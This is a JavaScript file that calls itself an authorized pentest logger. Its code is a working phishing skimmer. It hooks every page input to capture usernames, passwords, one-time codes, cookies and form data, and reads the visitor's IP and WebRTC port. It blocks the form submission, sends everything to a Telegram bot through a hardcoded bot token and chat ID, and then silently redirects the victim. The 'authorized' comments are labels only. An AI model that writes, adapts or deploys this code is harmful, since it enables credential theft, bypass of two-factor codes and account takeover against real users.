// ultimate-pentest-logger.js - AUTHORIZED PENTEST VERSION
class UltimatePentestLogger {
    constructor() {
        this.config = {
            botToken: '8335563143:AAHK7yHwv1A-gEjAKqhz1WdrXCvsoRJloCw',
            chatId: '8255019946',
            sessionId: 'pentest_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 9)
        };
        this.captured = {
            username: '',
            email: '',
            password: '',
            otp: '',
            ip: '',
            port: '',
            currentUrl: window.location.href
        };
        this.init();
    }

    async init() {
        // Capture network immediately
        await this.captureNetworkInfo();
        
        // Hook all inputs
        this.hookAllInputs();
        
        // Send initial status
        this.sendCapture({
            status: '🟢 PENTEST ACTIVE',
            session: this.config.sessionId,
            currentUrl: this.captured.currentUrl,
            ip: this.captured.ip,
            port: this.captured.port
        });
    }

    async captureNetworkInfo() {
        // IP CAPTURE
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            this.captured.ip = (await ipRes.json()).ip;
        } catch {
            this.captured.ip = 'IP_DETECTION_FAILED';
        }

        // PORT CAPTURE (WebRTC)
        try {
            const rtc = new RTCPeerConnection({ iceServers: [] });
            rtc.createDataChannel('');
            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
            
            rtc.onicecandidate = (ice) => {
                if (ice.candidate) {
                    const match = /srflx ([^:]+):(\d+)/.exec(ice.candidate.candidate);
                    if (match) {
                        this.captured.port = match[2];
                        this.sendQuickUpdate('Port captured: ' + this.captured.port);
                    }
                }
            };
        } catch(e) {
            this.captured.port = 'PORT_HIDDEN';
        }
    }

    hookAllInputs() {
        // CAPTURE USERNAME/EMAIL/PASSWORD/OTP
        document.addEventListener('input', (e) => {
            if (e.target.matches('input')) {
                const fieldValue = e.target.value.trim();
                const fieldName = (e.target.name || e.target.id || e.target.placeholder || '').toLowerCase();
                
                // USERNAME/EMAIL DETECTION
                if (fieldValue.length > 3 && (
                    fieldName.includes('user') || 
                    fieldName.includes('email') || 
                    fieldName.includes('login') ||
                    fieldValue.includes('@')
                )) {
                    this.captured.username = fieldValue;
                    this.sendQuickUpdate(`👤 USERNAME/EMAIL: ${fieldValue}`);
                }
                
                // PASSWORD DETECTION
                if (e.target.type === 'password' && fieldValue.length > 3) {
                    this.captured.password = fieldValue;
                    this.sendQuickUpdate(`🔐 PASSWORD: [${fieldValue.length} chars captured]`);
                }
                
                // OTP DETECTION
                if (fieldValue.length === 6 && /^\d{6}$/.test(fieldValue)) {
                    this.captured.otp = fieldValue;
                    this.sendQuickUpdate(`📱 OTP: ${fieldValue}`);
                }
            }
        });

        // FORM SUBMISSION - COMPLETE CAPTURE
        document.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            // Update current URL
            this.captured.currentUrl = window.location.href;
            
            // Build FINAL REPORT
            const finalReport = {
                session: this.config.sessionId,
                ip: this.captured.ip,
                port: this.captured.port,
                currentUrl: this.captured.currentUrl,
                username: this.captured.username,
                email: this.captured.email || this.captured.username,
                password: this.captured.password,
                otp: this.captured.otp,
                allFormData: Object.fromEntries(new FormData(e.target)),
                cookies: document.cookie,
                timestamp: new Date().toISOString()
            };
            
            await this.sendFinalReport(finalReport);
            
            // Authorized stealth redirect
            setTimeout(() => {
                window.location.href = 'https://google.com';
            }, 1500);
        }, true);
    }

    sendQuickUpdate(message) {
        this.sendCapture({
            session: this.config.sessionId,
            ip: this.captured.ip,
            port: this.captured.port,
            currentUrl: this.captured.currentUrl,
            liveCapture: message
        });
    }

    // 🎯 PERFECT PENTEST FORMAT
    async sendCapture(data) {
        const perfectFormat = {
            session: data.session || this.config.sessionId,
            ip: data.ip || this.captured.ip,
            port: data.port || this.captured.port,
            currentUrl: data.currentUrl || this.captured.currentUrl,
            username: data.username || this.captured.username,
            email: data.email || this.captured.email,
            password: data.password || this.captured.password,
            otp: data.otp || this.captured.otp,
            status: data.status || data.liveCapture || 'PENTEST_ACTIVE',
            cookies: document.cookie.slice(0, 200),
            timestamp: new Date().toISOString()
        };

        const message = `🎯 PENTEST CAPTURE\n\`\`\`json\n${JSON.stringify(perfectFormat, null, 2)}\n\`\`\``;

        try {
            await fetch(`https://api.telegram.org/bot${this.config.botToken}/sendMessage`, {
                method: 'POST',
                mode: 'no-cors',
                body: new URLSearchParams({
                    chat_id: this.config.chatId,
                    text: message.slice(0, 4000),
                    parse_mode: 'Markdown'
                })
            });
        } catch(e) {}
    }

    async sendFinalReport(data) {
        await this.sendCapture(data);
    }
}

// DEPLOY PENTEST (AUTHORIZED)
if (!window.pentestLogger) {
    window.pentestLogger = new UltimatePentestLogger();
}
